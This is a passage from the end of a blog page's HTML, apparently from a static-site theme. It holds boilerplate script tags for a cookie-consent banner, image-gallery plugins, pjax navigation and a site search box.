        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>